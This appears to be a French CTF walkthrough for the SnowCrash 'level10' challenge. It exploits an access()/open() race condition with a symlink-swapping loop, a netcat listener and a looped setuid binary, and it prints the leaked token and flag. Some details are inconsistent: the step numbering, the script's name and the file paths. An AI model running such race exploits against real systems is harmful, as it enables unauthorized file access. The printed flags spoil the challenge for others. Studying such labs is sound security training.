@@ -1,0 +1,90 @@
+-----------------------------------------------------------
+                          LEVEL10
+-----------------------------------------------------------
+
+1. On regarde les fichiers mis à notre disposition :
+   --------------------------------------------------------
+   CMD : ls
+   OUTPUT : level10 token
+
+2. On effectue la commande string sur le l'executable
+   level10. On constate que le script level10 utilise les
+   fonctions access et open. 
+   --------------------------------------------------------
+   CMD : strings level10
+   OUTPUT : [...]
+            access
+            open
+            [...]
+
+3. En consultant le man de access, on peut est informer 
+   d'une faille de sécurité quand ce dernier est utilisé
+   avec la fonction open. En effet, entre le call de
+   access et open, il y a un delais pendant lequel le 
+   fichier peut etre swap avec un autre, et ce second sera 
+   ouvert independament de ses autorisations.
+   --------------------------------------------------------
+   CMD : man access
+   OUTPUT : [...]
+            Warning: Using access() to check if a user is 
+            authorized to, for example, open a file before 
+            actually doing so using open(2) creates a
+            security hole, because the user might exploit 
+            the short time interval between checking and 
+            opening the file  to  manipulate it. For this 
+            reason, the use of this system call should be 
+            avoided.
+            [...]
+
+5. De fait, on créé un fichier tests qui contient une
+   string au choix :
+   --------------------------------------------------------
+   CMD : echo "Snowcrash : Level 10 !" > /tmp/tests
+
+4. Par la suit, on réalise un script bash qui va venir 
+   swapperun fichier /tmp/tests avec le fichier token avec un 
+   lien symbolique /tmp/swap 
+   (./level10/resources/script.py).
+   --------------------------------------------------------
+   SCRIPT : #!/bin/sh
+
+            while : ; do
+               ln -fs /home/user/level10/tests /tmp/swap
+               ln -fs /home/user/level10/token /tmp/swap
+            done
+
+5. Parralèllement, on ouvre un second terminal dans lequel
+   on va se connecter à la VM et que l'on va mettre entre
+   mode écoute infini sur le réseau.
+   --------------------------------------------------------
+   CMD : nc -lk localhost 6969
+
+6. Enfin, on re-ouvre un troisième et dernier terminal dans
+   lequel on va se re-connecter de nouveau à la VM et où
+   l'on va exécuter le fichier level10 en boucle sur le
+   même réseau que netcat (localhost/127.0.01).
+   --------------------------------------------------------
+   CMD : while : ; do ./level10 /tmp/swap 127.0.0.1; done
+
+7. Maintenant, on obtient le contenu des 2 fichiers token
+   et /tmp/tests à interval régulier dans l'onglet de 
+   connextion au réseau netcat.
+   --------------------------------------------------------
+   OUTPUT : [...]
+
+            .*( )*.
+            salut les amis
+
+            [...]
+
+            .*( )*.
+            woupa2yuojeeaaed06riuj63c
+
+            [...]
+
+8. Il suffit maintenant de get le flag pour le niveau
+   suivant avec la commande getflag
+   --------------------------------------------------------
+   CMD : getflag 
+   OUTPUT : Check flag.
+            Here is your token : feulo4b72j7edeahuete3no7c 
